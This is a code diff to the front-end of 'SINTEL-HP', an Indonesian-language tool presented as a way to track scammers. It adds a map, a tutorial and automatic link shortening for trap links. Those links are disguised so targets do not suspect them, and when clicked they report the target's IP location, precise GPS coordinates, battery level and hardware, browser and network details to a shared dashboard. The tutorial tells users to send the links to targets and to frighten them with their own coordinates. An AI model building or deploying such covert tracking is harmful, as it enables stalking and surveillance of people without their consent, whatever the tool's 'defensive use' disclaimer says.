@@ -9,6 +9,8 @@
         href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&family=Space+Mono:ital,wght@0,400;0,700;1,400&display=swap"
         rel="stylesheet">
     <script src="https://unpkg.com/lucide@latest"></script>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <style>
         :root {
             --bg-color: #050505;
@@ -205,6 +207,15 @@
             overflow: hidden;
         }
 
+        #map {
+            height: 250px;
+            width: 100%;
+            border-radius: 12px;
+            margin-bottom: 1.5rem;
+            border: 1px solid var(--glass-border);
+            z-index: 1;
+        }
+
         .pulse-indicator {
             display: inline-block;
             width: 8px;
@@ -253,7 +264,8 @@
         }
 
         #panelTracker,
-        #panelTrap {
+        #panelTrap,
+        #panelTutor {
             display: none;
         }
 
@@ -325,12 +337,18 @@
     <div class="header">
         <h1 class="title">SINTEL-HP</h1>
         <p class="subtitle">Live Tracker & HLR Region Lookup</p>
+        <p
+            style="color: var(--text-dim); font-size: 0.85rem; max-width: 500px; margin: 10px auto 0; line-height: 1.4; font-style: italic;">
+            Tool OSINT untuk melacak jejak digital nomor penipu. Gunakan dengan bijak untuk pertahanan diri &
+            investigasi defensif. Penyalahgunaan untuk tindakan ilegal adalah tanggung jawab penuh pengguna.
+        </p>
     </div>
 
     <div class="container">
         <div class="tabs">
-            <div class="tab" onclick="switchTab('panelTrap', this)">1. LACAK NOMOR (HLR) 📱</div>
-            <div class="tab active" onclick="switchTab('panelTracker', this)">2. LIVE GPS TRACKER 🌍</div>
+            <div class="tab active" onclick="switchTab('panelTutor', this)">CARA PAKAI 📖</div>
+            <div class="tab" onclick="switchTab('panelTrap', this)">LACAK NOMOR 📱</div>
+            <div class="tab" onclick="switchTab('panelTracker', this)">GPS TRACKER 🌍</div>
         </div>
 
         <div class="glass-panel">
@@ -356,7 +374,7 @@
             </div>
 
             <!-- PANEL 2: LIVE TRACKER / DASHBOARD -->
-            <div id="panelTracker" class="active-panel">
+            <div id="panelTracker">
                 <div id="setupView">
                     <p style="color:var(--text-dim); margin-bottom: 1.5rem;">
                         <b>[FITUR GPS REAL-TIME]</b><br>
@@ -379,13 +397,28 @@
                         <i data-lucide="radar" style="color:var(--primary);"></i>
                     </div>
 
+                    <div id="map"></div>
+
+                    <div
+                        style="display:flex; gap:15px; font-size:0.7rem; margin-bottom:1rem; justify-content:center; color:var(--text-dim);">
+                        <div style="display:flex; align-items:center; gap:5px;"><span
+                                style="width:10px; height:10px; background:#ff4444; border-radius:50%; display:inline-block;"></span>
+                            IP Lookup (Blok/Kota)</div>
+                        <div style="display:flex; align-items:center; gap:5px;"><span
+                                style="width:10px; height:10px; background:#22ff22; border-radius:50%; display:inline-block;"></span>
+                            GPS Satelit (Akurat)</div>
+                    </div>
+
                     <p style="font-size:0.9rem; color:var(--text-dim);">Kirim URL jebakan di bawah ini ke target. Jangan
                         tutup halaman ini, kalo diklik koordinat akan muncul otomatis!</p>
 
                     <div style="display:flex; gap:10px; margin-bottom: 1.5rem;">
                         <div class="trap-linkbox" id="displayTrapLink" onclick="copyTrapLink()"
                             style="cursor:pointer; flex: 1; margin: 0;" title="Klik Untuk Copy"></div>
-                        <button onclick="resetTracker()"
+                        <button onclick="shareDashboard()" title="Bagikan Dashboard ke Teman"
+                            style="background: rgba(0,240,255,0.2); color: var(--primary); border: 1px solid var(--primary); border-radius: 8px; cursor: pointer; padding: 0 15px; font-weight: bold;"><i
+                                data-lucide="share-2"></i></button>
+                        <button onclick="resetTracker()" title="Stop & Reset"
                             style="background: rgba(255,0,85,0.2); color: var(--accent); border: 1px solid var(--accent); border-radius: 8px; cursor: pointer; padding: 0 15px; font-weight: bold;"><i
                                 data-lucide="power-off"></i></button>
                     </div>
@@ -396,29 +429,135 @@
                 </div>
             </div>
 
+            <!-- PANEL 3: TUTORIAL / CARA PAKAI -->
+            <div id="panelTutor" class="active-panel">
+                <div class="tutor-container" style="font-size: 0.85rem; color: var(--text-dim); line-height: 1.6;">
+
+                    <!-- STEP 1 -->
+                    <div class="tutor-step"
+                        style="margin-bottom: 2rem; border-left: 2px solid var(--primary); padding-left: 1.5rem;">
+                        <h3
+                            style="color: var(--primary); font-family: 'Space Mono', monospace; margin-bottom: 0.5rem; display: flex; align-items: center; gap: 8px;">
+                            <i data-lucide="search" style="width:18px;"></i> STAGE 1: INTEL GATHERING
+                        </h3>
+                        <p>Lu dapet nomor penipu? Masukin ke <b>Tab Lacak Nomor</b>. Liat <b>HLR Region</b>-nya.
+                            Kalo penipu ngaku di Jakarta tapi kartunya terdaftar di "Sulawesi Utara", berarti dia lagi
+                            pake kartu 'buangan' atau emang gerombolan sindikat luar kota. Pakai info ini buat
+                            nge-skakmat omongan dia!</p>
+                    </div>
+
+                    <!-- STEP 2 -->
+                    <div class="tutor-step"
+                        style="margin-bottom: 2rem; border-left: 2px solid var(--accent); padding-left: 1.5rem;">
+                        <h3
+                            style="color: var(--accent); font-family: 'Space Mono', monospace; margin-bottom: 0.5rem; display: flex; align-items: center; gap: 8px;">
+                            <i data-lucide="crosshair" style="width:18px;"></i> STAGE 2: PREPARING THE TRAP
+                        </h3>
+                        <p>Pindah ke <b>Tab GPS Tracker</b>. Masukin link asli yang mau lu tuju (misal:
+                            YouTube/Google). Klik tombol merah buat generate link jebakan. </p>
+                        <div
+                            style="background: rgba(255,255,255,0.05); padding: 10px; border-radius: 8px; margin-top: 10px; border: 1px dashed var(--glass-border);">
+                            <b>💡 AUTO-SHORTEN:</b> Link jebakan lu otomatis dipendekin biar nggak curiga. Gak perlu
+                            manual lagi pake bit.ly!
+                        </div>
+                    </div>
+
+                    <!-- STEP 3 -->
+                    <div class="tutor-step"
+                        style="margin-bottom: 2rem; border-left: 2px solid var(--success); padding-left: 1.5rem;">
+                        <h3
+                            style="color: var(--success); font-family: 'Space Mono', monospace; margin-bottom: 0.5rem; display: flex; align-items: center; gap: 8px;">
+                            <i data-lucide="shield-alert" style="width:18px;"></i> STAGE 3: EXECUTION & MULTI-TRACKING
+                        </h3>
+                        <p>Kirim link ke target. Dashboard ini bisa nampilin <b>Banyak Target sekaligus</b>. Tiap orang
+                            yang klik bakal muncul sebagai Pin baru di peta.</p>
+                        <ul style="list-style: none; padding-left: 10px; margin-top: 5px;">
+                            <li style="margin-bottom: 5px;"><span style="color:#ff4444">• Pin Merah</span>: Lokasi kasar
+                                via IP (radius 1-5km).</li>
+                            <li style="margin-bottom: 5px;"><span style="color:#22ff22">• Pin Hijau</span>: Lokasi
+                                akurat via Satelit (radius 5-10m).</li>
+                        </ul>
+                    </div>
+
+                    <!-- STEP 4 -->
+                    <div class="tutor-step"
+                        style="margin-bottom: 1.5rem; border-left: 2px solid #ffcc00; padding-left: 1.5rem;">
+                        <h3
+                            style="color: #ffcc00; font-family: 'Space Mono', monospace; margin-bottom: 0.5rem; display: flex; align-items: center; gap: 8px;">
+                            <i data-lucide="user-check" style="width:18px;"></i> NEXT STEPS: REPORTING
+                        </h3>
+                        <p>Dapet lokasinya? Screenshot data koordinat + IP-nya. Kirim balik ke si penipu biar dia
+                            ketar-ketir, atau laporin ke <b>cekrekening.id</b> biar rekening dia diblokir permanen.
+                            Selamatkan korban lainnya!</p>
+                    </div>
+
+                </div>
+            </div>
+
         </div>
     </div>
 
     <script>
         lucide.createIcons();
         let eventSource = null;
+        let map = null;
+        let markers = {}; // Store markers by IP or some ID to move them
+
+        // Initialize Map
+        function initMap() {
+            if (map) return;
+            map = L.map('map', { attributionControl: false }).setView([-2.5, 118], 5); // Center of Indonesia
+            L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+                maxZoom: 19
+            }).addTo(map);
+        }
 
         // Restore state on load if exists
         window.addEventListener('DOMContentLoaded', () => {
+            const urlParams = new URLSearchParams(window.location.search);
+            const urlTopic = urlParams.get('topic');
+
+            if (urlTopic) {
+                // Auto switch and listen if topic in URL (Monitoring Mode)
+                switchTab('panelTracker', document.querySelector('.tab[onclick*="panelTracker"]'));
+                document.getElementById('setupView').style.display = 'none';
+                document.getElementById('dashboardView').style.display = 'block';
+                document.getElementById('displayTrapLink').innerText = "📡 MONITORING MODE: " + urlTopic;
+                initMap();
+                listenToDashboard(urlTopic);
+                return;
+            }
+
             const savedTopic = localStorage.getItem('sintel_topic');
             const savedTrapLink = localStorage.getItem('sintel_trap_link');
             if (savedTopic && savedTrapLink) {
                 document.getElementById('setupView').style.display = 'none';
                 document.getElementById('dashboardView').style.display = 'block';
                 document.getElementById('displayTrapLink').innerText = savedTrapLink;
+                initMap();
                 listenToDashboard(savedTopic);
             }
         });
+
+        function shareDashboard() {
+            const topic = localStorage.getItem('sintel_topic') || new URLSearchParams(window.location.search).get('topic');
+            if (!topic) return alert('Bikin link tracker dulu ngab!');
+
+            const shareUrl = `${window.location.origin}${window.location.pathname}?topic=${topic}`;
+            navigator.clipboard.writeText(shareUrl);
+            alert("✅ Link Dashboard (Read-Only) Berhasil di-Copy! Bagikan ke teman mabar lu biar bisa ikut mantau radar.");
+        }
 
         function resetTracker() {
             localStorage.removeItem('sintel_topic');
             localStorage.removeItem('sintel_trap_link');
             if (eventSource) eventSource.close();
+
+            if (map) {
+                map.remove();
+                map = null;
+            }
+            markers = {};
 
             document.getElementById('setupView').style.display = 'block';
             document.getElementById('dashboardView').style.display = 'none';
@@ -431,6 +570,7 @@
             element.classList.add('active');
             document.getElementById('panelTracker').classList.remove('active-panel');
             document.getElementById('panelTrap').classList.remove('active-panel');
+            document.getElementById('panelTutor').classList.remove('active-panel');
             document.getElementById(panelId).classList.add('active-panel');
         }
 
@@ -463,12 +603,22 @@
             document.getElementById('loader1').style.display = 'none';
         }
 
-        function generateTracker() {
+        async function generateTracker() {
             const target = document.getElementById('targetUrlInput').value;
             const topicId = 'sintel_' + Math.random().toString(36).substring(2, 10);
             const tBase = btoa(target);
 
-            const trapLink = `${window.location.origin}/api/trap?topic=${topicId}&t=${tBase}`;
+            const rawLink = `${window.location.origin}/api/trap?topic=${topicId}&t=${tBase}`;
+            let trapLink = rawLink;
+
+            // Optional: Auto-shorten using our internal API
+            try {
+                const sReq = await fetch(`/api/shorten?url=${encodeURIComponent(rawLink)}`);
+                const sData = await sReq.json();
+                if (sData.shorturl) trapLink = sData.shorturl;
+            } catch (e) {
+                console.warn("Shortening failed, using raw link");
+            }
 
             // Save state
             localStorage.setItem('sintel_topic', topicId);
@@ -478,6 +628,7 @@
             document.getElementById('dashboardView').style.display = 'block';
             document.getElementById('displayTrapLink').innerText = trapLink;
 
+            initMap();
             listenToDashboard(topicId);
         }
 
@@ -500,27 +651,69 @@
                 if (data.event === 'message' && data.message) {
                     try {
                         const tgt = JSON.parse(data.message);
+                        const latVal = parseFloat(tgt.lat);
+                        const lonVal = parseFloat(tgt.lon);
                         const mapsLink = tgt.lat ? `https://www.google.com/maps?q=${tgt.lat},${tgt.lon}` : null;
 
+                        // Add/Update Marker on Map
+                        if (latVal && lonVal) {
+                            const markerKey = tgt.ip + (tgt.type === 'GPS_SAT' ? '_gps' : '_ip');
+                            if (markers[markerKey]) {
+                                markers[markerKey].setLatLng([latVal, lonVal]).update();
+                            } else {
+                                const customIcon = L.icon({
+                                    iconUrl: tgt.type === 'GPS_SAT' ? 'https://raw.githubusercontent.com/pointhi/leaflet-color-markers/master/img/marker-icon-2x-green.png' : 'https://raw.githubusercontent.com/pointhi/leaflet-color-markers/master/img/marker-icon-2x-red.png',
+                                    shadowUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/0.7.7/images/marker-shadow.png',
+                                    iconSize: [25, 41], iconAnchor: [12, 41], popupAnchor: [1, -34], shadowSize: [41, 41]
+                                });
+                                markers[markerKey] = L.marker([latVal, lonVal], { icon: customIcon }).addTo(map)
+                                    .bindPopup(`<b>Target ${tgt.type || 'IP'}</b><br>${tgt.city || '??'}`).openPopup();
+                            }
+                            map.setView([latVal, lonVal], 13);
+                        }
+
                         const logHtml = `
-                            <div class="log-entry">
-                                <div style="color:white; font-weight:bold; margin-bottom:5px;">⚠️ PING MASUK DARI TARGET! ⚠️</div>
-                                <div style="color:var(--text-dim); margin-bottom:8px;">Jam: ${new Date(tgt.time).toLocaleTimeString()} WIB</div>
-                                <div><strong>IP:</strong> ${tgt.ip}</div>
-                                <div><strong>Lokasi:</strong> ${tgt.city}, ${tgt.region} (${tgt.country})</div>
-                                <div><strong>ISP / Provider:</strong> ${tgt.isp}</div>
-                                ${mapsLink ? `<div><strong>GPS Target:</strong> <a href="${mapsLink}" target="_blank" class="log-link">Buka Google Maps</a></div>` : ''}
+                            <div class="log-entry" style="border-left: 3px solid ${tgt.lat ? 'var(--success)' : 'var(--accent)'}">
+                                <div style="display:flex; justify-content:space-between; align-items:start;">
+                                    <div style="color:white; font-weight:bold; margin-bottom:5px;">
+                                        ${tgt.lat ? '📡 GPS TERKUNCI (ACCURATE)' : '⚠️ PING MASUK (IP ONLY)'}
+                                    </div>
+                                    <div style="font-size:0.7rem; color:var(--text-dim)">${new Date(tgt.time).toLocaleTimeString()}</div>
+                                </div>
+                                
+                                <div style="display:grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 10px 0;">
+                                    <div><span style="color:var(--text-dim)">IP:</span> ${tgt.ip}</div>
+                                    <div><span style="color:var(--text-dim)">Batt:</span> <span style="color:${tgt.charging === 'Charging' ? 'var(--success)' : 'white'}">${tgt.battery || '??'} ${tgt.charging === 'Charging' ? '⚡' : ''}</span></div>
+                                    <div><span style="color:var(--text-dim)">GPU:</span> ${tgt.gpu ? tgt.gpu.substring(0, 15) + '...' : 'Unknown'}</div>
+                                    <div><span style="color:var(--text-dim)">Cores/OS:</span> ${tgt.cpu || '?'} | ${tgt.platform || 'Unknown'}</div>
+                                </div>
+
+                                <div style="font-size:0.8rem; background:rgba(0,0,0,0.4); padding:8px; border-radius:5px; margin-bottom:10px;">
+                                    <div style="display:flex; justify-content:space-between; margin-bottom: 5px;">
+                                        <span><i data-lucide="monitor" style="width:12px; vertical-align:middle;"></i> Res: ${tgt.screen || 'Unknown'}</span>
+                                        <span><i data-lucide="mouse-pointer-2" style="width:12px; vertical-align:middle;"></i> Touch: ${tgt.touch === 'Yes' ? '<span style="color:var(--success)">Yes</span>' : '<span style="color:var(--primary)">No</span>'}</span>
+                                    </div>
+                                    <div style="display:flex; justify-content:space-between; margin-bottom: 5px;">
+                                        <span><i data-lucide="wifi" style="width:12px; vertical-align:middle;"></i> Net: ${tgt.network ? tgt.network.toUpperCase() : '??'}</span>
+                                        <span><i data-lucide="globe" style="width:12px; vertical-align:middle;"></i> Lang: ${tgt.language || '??'}</span>
+                                    </div>
+                                    <div style="color:var(--text-dim);"><i data-lucide="clock" style="width:12px; vertical-align:middle;"></i> TZ: ${tgt.timezone || 'Unknown'}</div>
+                                </div>
+
+                                ${mapsLink ? `<div><a href="${mapsLink}" target="_blank" class="log-link" style="font-weight:bold; color:var(--success)">📍 BUKA DI GOOGLE MAPS</a> <span style="font-size:0.7rem; color:var(--text-dim)">(Acc: ${tgt.accuracy || '?'})</span></div>` : ''}
+                                
                                 <details style="margin-top:10px; cursor:pointer;">
-                                    <summary style="color:var(--text-dim)">Detail Hape / Browser (Klik)</summary>
-                                    <pre>${tgt.ua}</pre>
+                                    <summary style="color:var(--text-dim); font-size:0.75rem;">Full Device Info (UA)</summary>
+                                    <pre style="font-size:0.7rem; background:#000; padding:5px; border-radius:4px; margin-top:5px;">${tgt.ua}</pre>
                                 </details>
                             </div>
                         `;
                         document.getElementById('logsContainer').insertAdjacentHTML('afterbegin', logHtml);
+                        lucide.createIcons(); // Re-render icons for new logs
 
                         // play sound alert
                         try { new Audio('https://actions.google.com/sounds/v1/alarms/beep_short.ogg').play(); } catch (e) { }
-                    } catch (e) { console.error('Payload parse failed'); }
+                    } catch (e) { console.error('Payload parse failed', e); }
                 }
             });
         }
